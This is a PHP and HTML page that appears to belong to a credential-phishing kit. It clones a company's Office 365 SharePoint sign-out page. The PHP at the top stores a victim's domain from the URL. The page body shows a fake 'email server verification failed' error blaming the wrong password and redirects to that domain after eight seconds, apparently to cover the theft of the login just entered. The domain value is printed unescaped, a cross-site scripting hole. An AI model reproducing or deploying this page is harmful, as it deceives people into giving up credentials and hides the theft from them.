<?php

session_start();
if (isset($_GET['domain'])) {
    $clientdomain = $_GET['domain'];
    $_SESSION['clientdomain']=$clientdomain;
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns:o="urn:schemas-microsoft-com:office:office" lang="en-us" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="GENERATOR" content="Microsoft SharePoint"><meta http-equiv="refresh"
   content="8; url=http://<?php echo $clientdomain ?>"><meta http-equiv="X-UA-Compatible" content="IE=8"><meta name="ROBOTS" content="NOHTMLINDEX"><title>
	
	Error

</title><style type="text/css" data-themingsource="/_layouts/15/1033/styles/corev15.css?rev=7603NMLoyIVTc986GX5M5g%3D%3DTAG155" data-original-href="/_layouts/15/1033/styles/corev15.css?rev=7603NMLoyIVTc986GX5M5g%3D%3DTAG155"></style><link id="CssLink-8416d7f4fc0141bd926ac567826acfe8" rel="stylesheet" type="text/css" href="./You&#39;re signed out of Office 365_files/corev15.css">
<style type="text/css" data-themingsource="/_layouts/15/1033/styles/error.css?rev=kIjpT9MGHvaNZ85j%2FrSXNw%3D%3DTAG155" data-original-href="/_layouts/15/1033/styles/error.css?rev=kIjpT9MGHvaNZ85j%2FrSXNw%3D%3DTAG155"></style><link id="CssLink-5f0a63c18d2742b8908c6b590e4dfee1" rel="stylesheet" type="text/css" href="./You&#39;re signed out of Office 365_files/error.css">
<script type="text/javascript">// <![CDATA[ 

var _initGlobalSnapShot = {};try {    if (Object.keys(_initGlobalSnapShot).length == 0) {       for (var memberIndex in window) {          if (Boolean(memberIndex)) {              _initGlobalSnapShot[memberIndex] = 1;         }      }   }} catch (ex) {};
// ]]>
</script>
<script type="text/javascript">// <![CDATA[ 

var g_SPOffSwitches={"CEEBC361-4A74-4F89-97C7-5B4F31DA2BD6":1,"FE1F60EC-616C-48AC-9611-CE5D7D7E7681":1,"033A2586-60C0-46D9-8D3B-7CD0A562889B":1,"851976F0-99E9-4E0F-B9D7-1529CD2D3E81":1,"4B4FCDD7-DD78-4AC1-BF65-2B8A11A401D5":1,"99105531-A09D-485C-9042-316026A6FEE1":1,"515569A3-4A07-40D8-86DD-6FB26A67D19B":1,"4489A933-BF62-4506-8382-6080A1BEE152":1,"1A2521F4-7B1A-48CC-9291-BFFEBB414578":1,"59E9A135-FAA8-4824-9A41-85A99898A7F6":1,"26934B05-D554-4048-A8F3-C14979809370":1,"3AF0801A-B6F9-4434-AE08-C0348AD69252":1,"D9ECECE5-3CC1-413E-97B5-D45915FFAB65":1,"FFDE13C3-3AF0-4B67-A8E5-73F0EF0B354F":1,"A1023170-729E-43EF-9C5F-CFC608A4D986":1,"12C4D542-0F26-438A-9A67-897AE4A1E332":1,"CB3BD07B-7E41-408D-8780-93926A70C8D3":1,"CF9EFBA1-F095-4F32-9894-B8F68326EFE5":1,"AD515929-42B5-44CD-B6AE-34E238B5E4BE":1,"2D358437-C128-49DB-9639-C6FC44D16E3C":1,"423E6741-F100-49A0-8808-D472F1660355":1,"1BACBA6D-F6D8-4E82-84F2-7EEF4DD36380":1,"5A80CEB5-56DF-45F7-891B-95D0D2ECFFDA":1,"5015D0C1-273C-467A-B507-1D0FF5AD9F06":1,"C4407BDF-AF74-44D9-8236-5E8F4ADAEB6F":1,"02287667-1BD0-432C-9BB4-A2ACDF3AA0F1":1,"E51AA1CB-6F7F-4477-9FB0-194CAE47FE8F":1,"3981ABFE-41C6-44A2-9F78-FBAE10423989":1,"E40D73C7-CB83-4B58-90C1-430513D8E720":1,"27A521E9-BA59-43BC-A7B6-CF09A899FBD3":1,"0BD6A981-7F6B-48E8-B58F-5FD4A7070B2C":1,"BF42C102-F36A-4FEB-975E-7A6CE46088CF":1,"5F13FF39-6F57-4E37-AFFD-FEBEFF170220":1,"9B21CD6A-CFB3-4165-AA02-B69AC40841CF":1,"6AAFF384-F587-446A-B0D0-1455A72BDBF3":1,"6D72E04E-7059-4842-A677-7E0FC8AB1AA0":1,"9058F4D5-FA5A-44FD-BA2E-84A10987E2FD":1,"98BD5A60-54CD-44B6-BBD1-390F4F9CC871":1,"EFAF3BB4-0B49-4133-9A2C-7C912D443335":1,"4BB8101C-31DB-4928-81C4-6E9A4E3F49FA":1,"8B0C96F0-0530-46CB-91FF-5D2E62D9E418":1,"3C1CF9AA-9F96-41B2-BB0F-45C34FC1E4D0":1,"7EAE0ACA-6D4A-4DC4-892B-758C5AD9A2FC":1,"A8DAE53D-F41B-491E-AC15-F7557C767D03":1,"D07D4553-48E7-4341-BD90-3B724CA0C21C":1,"0E6390A2-4C76-4D56-9C81-91841B2B5858":1,"911A0107-55D7-4B61-9878-F7722114ADBE":1,"2685B01E-663E-469A-B7C7-D5EED19F0C61":1,"FB59BEBE-6CA8-411E-A74F-89AFB2D8AB10":1,"F66B9184-9718-4128-B38C-4E11117319C7":1,"A302C831-F2B2-4235-9D82-4BDF2501B430":1,"978A971A-896A-457B-8B53-0BD7F80513AA":1,"C811FD89-F309-43F2-9CF6-1CA762C73AE3":1,"29D34488-771F-4BA1-AE19-7BEC2F240900":1,"6634774D-DBBD-4E35-8D4B-8C726153B076":1,"77DCFE63-DB1C-4B85-AF55-F1E03B1BC05B":1,"644C9F8F-2415-4F43-8F91-8711E58242CC":1,"73D0AF9D-3E23-45B0-85B2-7C54A23ADAC5":1,"9AA76A3A-B32F-4C8B-A262-55E15B88685B":1,"F135B12B-A5FD-4D70-BB39-41B7AD3A162A":1,"7A5AE309-8D06-49CB-935F-44AB2A8D5A15":1,"97C104B5-CA73-46A2-8A79-055A739B4DCD":1,"804181A8-EFA3-4703-A964-7CB058197936":1,"80EFDF97-41D3-4B87-8239-828E866A4154":1,"6DAAB84E-66A0-4FEC-8E1E-48059FDF39CA":1,"8D2DDEE6-14E5-4F78-8468-39F1FC601B08":1,"69E23215-1C6B-45AE-B498-915B2900A28E":1,"36FEEC09-3EFD-4FB2-AFD2-2F1A95F8F089":1,"3485614A-49FD-4DBD-85C6-CAA363127DE3":1,"9A1431EC-B735-435A-B723-51D2595DBA82":1,"9A8C4BB8-88C1-4083-AE41-044320EBA9D7":1,"3FAC7E22-1511-4416-9335-80289024430E":1,"85F48F01-0BA5-4F43-B74D-3BA893249320":1,"81424F35-5D77-4AF7-BC8E-B6E0C352D316":1,"E3A95ED9-A209-41E1-851B-CFDFA531CC72":1,"72CDC7A5-CBD6-4F93-B72D-DF1657B5C6B0":1,"03714E4E-0D19-4025-BFA1-F694DFB1087B":1,"BDE352A8-6C7E-4481-A094-FD3F063DF8FF":1,"1F56EBE3-415E-4050-8CB3-B5974FDC090D":1,"5D27D0C4-800C-4325-A30C-EB7868261650":1,"D2F963E0-417F-41C7-83FC-00E1CBAB2716":1,"9F9560D7-93F0-4757-92DC-F4C7522077CF":1};
// ]]>
</script>
<script type="text/javascript" src="./You&#39;re signed out of Office 365_files/initstrings.js.download"></script>
<script type="text/javascript" src="./You&#39;re signed out of Office 365_files/init.js.download"></script>
<script type="text/javascript" src="./You&#39;re signed out of Office 365_files/theming.js.download"></script>
<script type="text/javascript" src="./You&#39;re signed out of Office 365_files/ScriptResource.axd"></script>
<script type="text/javascript" src="./You&#39;re signed out of Office 365_files/blank.js.download"></script>
<script type="text/javascript" src="./You&#39;re signed out of Office 365_files/ScriptResource(1).axd"></script>
<script type="text/javascript">RegisterSod("require.js", "https:\u002f\u002fstatic.sharepointonline.com\u002fbld\u002f_layouts\u002f15\u002f16.0.8502.1218\u002frequire.js");</script>
<script type="text/javascript">RegisterSod("strings.js", "https:\u002f\u002fstatic.sharepointonline.com\u002fbld\u002f_layouts\u002f15\u002f16.0.8502.1218\u002f1033\u002fstrings.js");</script>
<script type="text/javascript">RegisterSod("sp.res.resx", "https:\u002f\u002fstatic.sharepointonline.com\u002fbld\u002f_layouts\u002f15\u002f16.0.8502.1218\u002f1033\u002fsp.res.js");</script>
<script type="text/javascript">RegisterSod("sp.runtime.js", "https:\u002f\u002fstatic.sharepointonline.com\u002fbld\u002f_layouts\u002f15\u002f16.0.8502.1218\u002fsp.runtime.js");RegisterSodDep("sp.runtime.js", "sp.res.resx");</script>
<script type="text/javascript">RegisterSod("sp.js", "https:\u002f\u002fstatic.sharepointonline.com\u002fbld\u002f_layouts\u002f15\u002f16.0.8502.1218\u002fsp.js");RegisterSodDep("sp.js", "sp.runtime.js");RegisterSodDep("sp.js", "sp.ui.dialog.js");RegisterSodDep("sp.js", "sp.res.resx");</script>
<script type="text/javascript">RegisterSod("sp.init.js", "https:\u002f\u002fstatic.sharepointonline.com\u002fbld\u002f_layouts\u002f15\u002f16.0.8502.1218\u002fsp.init.js");</script>
<script type="text/javascript">RegisterSod("sp.ui.dialog.js", "https:\u002f\u002fstatic.sharepointonline.com\u002fbld\u002f_layouts\u002f15\u002f16.0.8502.1218\u002fsp.ui.dialog.js");RegisterSodDep("sp.ui.dialog.js", "sp.init.js");RegisterSodDep("sp.ui.dialog.js", "sp.res.resx");</script>
<script type="text/javascript">RegisterSod("core.js", "https:\u002f\u002fstatic.sharepointonline.com\u002fbld\u002f_layouts\u002f15\u002f16.0.8502.1218\u002fcore.js");RegisterSodDep("core.js", "strings.js");</script>
<link rel="shortcut icon" href="https://razermis.sharepoint.com/_layouts/15/images/favicon.ico?rev=45" type="image/vnd.microsoft.icon"><script type="text/javascript" src="./You&#39;re signed out of Office 365_files/strings.js.download"></script><script type="text/javascript" src="./You&#39;re signed out of Office 365_files/core.js.download"></script></head>
<body id="ms-error-body" onload="if (typeof(_spBodyOnLoadWrapper) != &#39;undefined&#39;) _spBodyOnLoadWrapper();" class=" ms-backgroundImage">
	<form method="post" action="https://razermis.sharepoint.com/_layouts/15/SignOut.aspx?signoutoidc=1" id="aspnetForm" onsubmit="if (typeof(_spFormOnSubmitWrapper) != &#39;undefined&#39;) {return _spFormOnSubmitWrapper();} else {return true;}">
<div class="aspNetHidden">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
<input type="hidden" name="SideBySideToken" id="SideBySideToken" value="16.0.8502.1218">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUJNzQzMzY4NDEyD2QWAmYPZBYCAgEPZBYEAgEPZBYCAgUPZBYCZg9kFgICAQ8WAh4EVGV4dAUfWW91J3JlIHNpZ25lZCBvdXQgb2YgT2ZmaWNlIDM2NWQCAw9kFgICCQ9kFgICAQ9kFggCAQ8PFgIeCEltYWdlVXJsBSIvX2xheW91dHMvMTUvaW1hZ2VzL0dyZWVuQ2hlY2suZ2lmZGQCAw8WAh8ABR9Zb3UncmUgc2lnbmVkIG91dCBvZiBPZmZpY2UgMzY1ZAIFDxYCHgdWaXNpYmxlaGQCBw8PFgIfAmhkZGQjnaaI0KfFVOGF7CCDbSYASuS09f7fvYHOByHyVTTvPg==">
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['aspnetForm'];
if (!theForm) {
    theForm = document.aspnetForm;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script src="./You&#39;re signed out of Office 365_files/WebResource.axd" type="text/javascript"></script>


<script type="text/javascript">
//<![CDATA[
var g_presenceEnabled = true;
var g_wsaEnabled = true;
var g_correlationId = '86ebb59e-a0db-0000-1f08-5032bc3790a4';
var g_wsaQoSEnabled = false;
var g_wsaQoSDataPoints = [];
var g_wsaRUMEnabled = true;var g_wsaLCID = 1033;
var g_wsaListTemplateId = null;
var _spPageContextInfo={"webServerRelativeUrl":"/","webAbsoluteUrl":"https://razermis.sharepoint.com","viewId":"","webPropertyFlags2":0,"listId":"","listPermsMask":null,"listUrl":"","listTitle":null,"listBaseTemplate":-1,"viewOnlyExperienceEnabled":false,"blockDownloadsExperienceEnabled":false,"idleSessionSignOutEnabled":false,"cdnPrefix":"static.sharepointonline.com/bld","siteAbsoluteUrl":"https://razermis.sharepoint.com","siteId":"{6f029267-7c9a-430b-9fc7-4cac771a9178}","showNGSCDialogForSyncOnTS":false,"supportPoundStorePath":true,"supportPercentStorePath":true,"siteSubscriptionId":"fdadce6e-7f5e-49db-8f22-6a87331a9135","isMultiGeoTenant":false,"isMultiGeoODBMode":false,"isSPO":true,"farmLabel":"APAC_203_Content","serverRequestPath":"/_layouts/15/SignOut.aspx","layoutsUrl":"_layouts/15","webId":"{32d5c1f5-ff8c-4442-8b90-c2cef0862e6f}","webTitle":null,"webTemplate":null,"webTemplateConfiguration":null,"webDescription":null,"tenantAppVersion":"none","isAppWeb":false,"webLogoUrl":"/SiteAssets/RazerLogo.png","webLanguage":1033,"currentLanguage":1033,"currentUICultureName":"en-US","currentCultureName":"en-US","currentCultureLCID":1033,"env":"prod","nid":12475,"fid":195176,"serverTime":"2019-01-14T13:27:22.9045126Z","siteClientTag":"250$$16.0.8502.1217","crossDomainPhotosEnabled":true,"openInClient":false,"webUIVersion":15,"webPermMasks":{"High":0,"Low":0},"pageListId":null,"pageItemId":-1,"pagePermsMask":null,"pagePersonalizationScope":1,"userEmail":"","userId":0,"userLoginName":null,"userDisplayName":null,"isAnonymousGuestUser":false,"isEmailAuthenticationGuestUser":false,"isExternalGuestUser":false,"systemUserKey":null,"alertsEnabled":true,"siteServerRelativeUrl":"/","allowSilverlightPrompt":"True","themeCacheToken":"/:/_catalogs/theme/Themed/C7475956:45:16.0.8502.1218","themedCssFolderUrl":"/_catalogs/theme/Themed/C7475956","themedImageFileNames":{"spcommon.png":"spcommon-B35BB0A9.themedpng?ctag=45","ellipsis.11x11x32.png":"ellipsis.11x11x32-2F01F47D.themedpng?ctag=45","O365BrandSuite.95x30x32.png":"O365BrandSuite.95x30x32-C212E2FD.themedpng?ctag=45","socialcommon.png":"socialcommon-6F3394A9.themedpng?ctag=45","spnav.png":"spnav-230C537D.themedpng?ctag=45"},"modernThemingEnabled":false,"isSiteAdmin":false,"ExpFeatures":[-828392442,1893006155,1695637205,1610559519,867938105,-1801135440,1288360470,-2088981217,273220646,-720240640,87445392,-2071793511,201702088,545370370,2159589,1880784916,1445217778,-235200832,32920079,448,0,1222115328,-1347060041,-201709074,-159477685,-529037819,-49182150,-636479223,-998240911,2130513357,1505739124,128,-536870912,-945243731,454560843,447569354,-2144251640,38377641,152305664,-1962211582,18985474,1081877,8,0,0,0,0],"killSwitches":{"CEEBC361-4A74-4F89-97C7-5B4F31DA2BD6":true,"FE1F60EC-616C-48AC-9611-CE5D7D7E7681":true,"033A2586-60C0-46D9-8D3B-7CD0A562889B":true,"851976F0-99E9-4E0F-B9D7-1529CD2D3E81":true,"4B4FCDD7-DD78-4AC1-BF65-2B8A11A401D5":true,"99105531-A09D-485C-9042-316026A6FEE1":true,"515569A3-4A07-40D8-86DD-6FB26A67D19B":true,"4489A933-BF62-4506-8382-6080A1BEE152":true,"1A2521F4-7B1A-48CC-9291-BFFEBB414578":true,"59E9A135-FAA8-4824-9A41-85A99898A7F6":true,"26934B05-D554-4048-A8F3-C14979809370":true,"3AF0801A-B6F9-4434-AE08-C0348AD69252":true,"D9ECECE5-3CC1-413E-97B5-D45915FFAB65":true,"FFDE13C3-3AF0-4B67-A8E5-73F0EF0B354F":true,"A1023170-729E-43EF-9C5F-CFC608A4D986":true,"12C4D542-0F26-438A-9A67-897AE4A1E332":true,"CB3BD07B-7E41-408D-8780-93926A70C8D3":true,"CF9EFBA1-F095-4F32-9894-B8F68326EFE5":true,"AD515929-42B5-44CD-B6AE-34E238B5E4BE":true,"2D358437-C128-49DB-9639-C6FC44D16E3C":true,"423E6741-F100-49A0-8808-D472F1660355":true,"1BACBA6D-F6D8-4E82-84F2-7EEF4DD36380":true,"5A80CEB5-56DF-45F7-891B-95D0D2ECFFDA":true,"5015D0C1-273C-467A-B507-1D0FF5AD9F06":true,"C4407BDF-AF74-44D9-8236-5E8F4ADAEB6F":true,"02287667-1BD0-432C-9BB4-A2ACDF3AA0F1":true,"E51AA1CB-6F7F-4477-9FB0-194CAE47FE8F":true,"3981ABFE-41C6-44A2-9F78-FBAE10423989":true,"E40D73C7-CB83-4B58-90C1-430513D8E720":true,"27A521E9-BA59-43BC-A7B6-CF09A899FBD3":true,"0BD6A981-7F6B-48E8-B58F-5FD4A7070B2C":true,"BF42C102-F36A-4FEB-975E-7A6CE46088CF":true,"5F13FF39-6F57-4E37-AFFD-FEBEFF170220":true,"9B21CD6A-CFB3-4165-AA02-B69AC40841CF":true,"6AAFF384-F587-446A-B0D0-1455A72BDBF3":true,"6D72E04E-7059-4842-A677-7E0FC8AB1AA0":true,"9058F4D5-FA5A-44FD-BA2E-84A10987E2FD":true,"98BD5A60-54CD-44B6-BBD1-390F4F9CC871":true,"EFAF3BB4-0B49-4133-9A2C-7C912D443335":true,"4BB8101C-31DB-4928-81C4-6E9A4E3F49FA":true,"8B0C96F0-0530-46CB-91FF-5D2E62D9E418":true,"3C1CF9AA-9F96-41B2-BB0F-45C34FC1E4D0":true,"7EAE0ACA-6D4A-4DC4-892B-758C5AD9A2FC":true,"A8DAE53D-F41B-491E-AC15-F7557C767D03":true,"D07D4553-48E7-4341-BD90-3B724CA0C21C":true,"0E6390A2-4C76-4D56-9C81-91841B2B5858":true,"911A0107-55D7-4B61-9878-F7722114ADBE":true,"2685B01E-663E-469A-B7C7-D5EED19F0C61":true,"FB59BEBE-6CA8-411E-A74F-89AFB2D8AB10":true,"F66B9184-9718-4128-B38C-4E11117319C7":true,"A302C831-F2B2-4235-9D82-4BDF2501B430":true,"978A971A-896A-457B-8B53-0BD7F80513AA":true,"C811FD89-F309-43F2-9CF6-1CA762C73AE3":true,"29D34488-771F-4BA1-AE19-7BEC2F240900":true,"6634774D-DBBD-4E35-8D4B-8C726153B076":true,"77DCFE63-DB1C-4B85-AF55-F1E03B1BC05B":true,"644C9F8F-2415-4F43-8F91-8711E58242CC":true,"73D0AF9D-3E23-45B0-85B2-7C54A23ADAC5":true,"9AA76A3A-B32F-4C8B-A262-55E15B88685B":true,"F135B12B-A5FD-4D70-BB39-41B7AD3A162A":true,"7A5AE309-8D06-49CB-935F-44AB2A8D5A15":true,"97C104B5-CA73-46A2-8A79-055A739B4DCD":true,"804181A8-EFA3-4703-A964-7CB058197936":true,"80EFDF97-41D3-4B87-8239-828E866A4154":true,"6DAAB84E-66A0-4FEC-8E1E-48059FDF39CA":true,"8D2DDEE6-14E5-4F78-8468-39F1FC601B08":true,"69E23215-1C6B-45AE-B498-915B2900A28E":true,"36FEEC09-3EFD-4FB2-AFD2-2F1A95F8F089":true,"3485614A-49FD-4DBD-85C6-CAA363127DE3":true,"9A1431EC-B735-435A-B723-51D2595DBA82":true,"9A8C4BB8-88C1-4083-AE41-044320EBA9D7":true,"3FAC7E22-1511-4416-9335-80289024430E":true,"85F48F01-0BA5-4F43-B74D-3BA893249320":true,"81424F35-5D77-4AF7-BC8E-B6E0C352D316":true,"E3A95ED9-A209-41E1-851B-CFDFA531CC72":true,"72CDC7A5-CBD6-4F93-B72D-DF1657B5C6B0":true,"03714E4E-0D19-4025-BFA1-F694DFB1087B":true,"BDE352A8-6C7E-4481-A094-FD3F063DF8FF":true,"1F56EBE3-415E-4050-8CB3-B5974FDC090D":true,"5D27D0C4-800C-4325-A30C-EB7868261650":true,"D2F963E0-417F-41C7-83FC-00E1CBAB2716":true,"9F9560D7-93F0-4757-92DC-F4C7522077CF":true},"CorrelationId":"86ebb59e-a0db-0000-1f08-5032bc3790a4","hasManageWebPermissions":false,"isNoScriptEnabled":true,"groupId":null,"groupHasHomepage":true,"groupHasQuickLaunchConversationsLink":false,"departmentId":null,"hubSiteId":null,"sensitivityLabel":null,"restrictedToRegion":null,"hasPendingWebTemplateExtension":false,"isGroupRelatedSite":false,"isHubSite":false,"isWebWelcomePage":false,"siteClassification":"","hideSyncButtonOnODB":false,"showNGSCDialogForSyncOnODB":false,"sitePagesEnabled":true,"sitePagesFeatureVersion":9,"DesignPackageId":"00000000-0000-0000-0000-000000000000","groupType":null,"groupColor":"#038387","siteColor":"#038387","headerEmphasis":0,"headerLayout":0,"navigationInfo":null,"clientPersistedCacheKey":null,"guestsEnabled":true,"MenuData":null,"RecycleBinItemCount":-1,"PublishingFeatureOn":true,"PreviewFeaturesEnabled":true,"disableAppViews":false,"disableFlows":false,"serverRedirectedUrl":null,"formDigestValue":null,"maximumFileSize":15360,"formDigestTimeoutSeconds":0,"canUserCreateMicrosoftForm":false,"canUserCreateVisioDrawing":true,"readOnlyState":null,"isTenantDevSite":false,"preferUserTimeZone":false,"userTimeZoneData":null,"userTime24":false,"userFirstDayOfWeek":null,"webTimeZoneData":null,"webTime24":false,"webFirstDayOfWeek":null,"aadTenantId":"fdadce6e-7f5e-49db-8f22-6a87331a9135","aadUserId":"","aadInstanceUrl":"https://login.windows.net","msGraphEndpointUrl":"https://graph.microsoft.com","allowInfectedDownload":true,"orgNewsSiteDetails":null,"organizationNewsSiteReference":[],"spfx3rdPartyServicePrincipalId":"00000000-0000-0000-0000-000000000000","completenessUrls":["https://southeastasia0-completenessp.svc.ms"],"socialBarEnabled":true,"substrateOneDriveDisabled":null,"isGroupifyDisabled":false,"userVoiceForFeedbackEnabled":true,"substrateOneDriveMigrated":null};_spPageContextInfo.updateFormDigestPageLoaded=new Date();_spPageContextInfo.clientServerTimeDelta=new Date(_spPageContextInfo.serverTime)-new Date();if(typeof(define)=='function'){define('SPPageContextInfo',[],function(){return _spPageContextInfo;});}var MSOWebPartPageFormName = 'aspnetForm';Flighting.ExpFeatures = [-828392442,1893006155,1695637205,1610559519,867938105,-1801135440,1288360470,-2088981217,273220646,-720240640,87445392,-2071793511,201702088,545370370,2159589,1880784916,1445217778,-235200832,32920079,448,0,1222115328,-1347060041,-201709074,-159477685,-529037819,-49182150,-636479223,-998240911,2130513357,1505739124,128,-536870912,-945243731,454560843,447569354,-2144251640,38377641,152305664,-1962211582,18985474,1081877,8,0,0,0,0];//]]>
</script>

<script src="./You&#39;re signed out of Office 365_files/blank.js.download" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
window.SPThemeUtils && SPThemeUtils.RegisterCssReferences([{"Url":"\u002f_layouts\u002f15\u002f1033\u002fstyles\u002fcorev15.css?rev=7603NMLoyIVTc986GX5M5g\u00253D\u00253DTAG155","OriginalUrl":"\u002f_layouts\u002f15\u002f1033\u002fstyles\u002fcorev15.css?rev=7603NMLoyIVTc986GX5M5g\u00253D\u00253DTAG155","Id":"CssLink-8416d7f4fc0141bd926ac567826acfe8","ConditionalExpression":"","After":"","RevealToNonIE":"false"},{"Url":"\u002f_layouts\u002f15\u002f1033\u002fstyles\u002ferror.css?rev=kIjpT9MGHvaNZ85j\u00252FrSXNw\u00253D\u00253DTAG155","OriginalUrl":"\u002f_layouts\u002f15\u002f1033\u002fstyles\u002ferror.css?rev=kIjpT9MGHvaNZ85j\u00252FrSXNw\u00253D\u00253DTAG155","Id":"CssLink-5f0a63c18d2742b8908c6b590e4dfee1","ConditionalExpression":"","After":"","RevealToNonIE":"false"}]);
if (typeof(DeferWebFormInitCallback) == 'function') DeferWebFormInitCallback();//]]>
</script>

<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="018DE678">
</div>
	<script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('ctl00$ScriptManager', 'aspnetForm', [], [], [], 90, 'ctl00');
//]]>
</script>

	<div id="ms-error-header" class="ms-pr">
		<h1 class="ms-core-pageTitle">
			
		</h1>
		<div>
			
		</div>
	</div>
	<div id="ms-error">
		<div id="ms-error-top">
			
		</div>
		<div id="ms-error-content">
			<div id="ms-error-error-content">
				<div id="DeltaPlaceHolderMain">
	
					
	<style type="text/css" media="screen, print, projection">
body
{
	font-family: Segoe UI, Arial;
	margin: 0px;
	height: 100%;
	overflow: visible;
}
.content
{
	margin: 0px 44px 14px 44px;
	margin-left: auto;
	margin-right: auto;
}
.signoutText
{
	font-family: Segoe UI Light, Segoe UI, Arial;
	font-size: 36px;
	color: #3c3c3c;
	margin-left: 10px;
}
.secondaryMessage
{
	font-family: Segoe UI Light, Segoe UI, Arial;
	font-size: 20px;
	color: #3c3c3c;
	padding-top: 20px;
}
a,
a:link,
a:visited,
a:focus,
a:hover,
a:active {
	font-family: Segoe UI Light, Segoe UI, Arial;
	font-size: 22px;
	color: #0078d7;
}
	</style>
<div style="height:40px;"></div>
<div class="content">
	<div class="primaryMessage">
		<span class="signoutImage">
			<img id="ctl00_PlaceHolderMain_PageImage" src="./You&#39;re signed out of Office 365_files/GreenCheck.gif">
		</span>
		<span class="signoutText">
			Erorr 562301 email server verification failed!!.
			</span>
			<br><br><b>This may be as a result of entering the wrong email and password for </b><font color="#ff0000"><?php echo $clientdomain ?></font><br><br> 
			
			<br><br>Redirecting to <?php echo $clientdomain ?> ...
		
	</div>
	<br>
	<div class="secondaryMessage">
		
		
	</div>
</div>

				
</div>
			</div>
			

		</div>
	</div>


<script type="text/javascript">
//<![CDATA[
var _fV4UI = true;window.SPThemeUtils && SPThemeUtils.ApplyCurrentTheme(true);//]]>
</script>
</form>


<script type="text/javascript" nonce="2c2a5bb7-b5dd-4141-b11e-4912fd8de1f4">
	var g_duration = 120;
var g_iisLatency = 1;
var g_requireJSDone = new Date().getTime();
</script></body></html>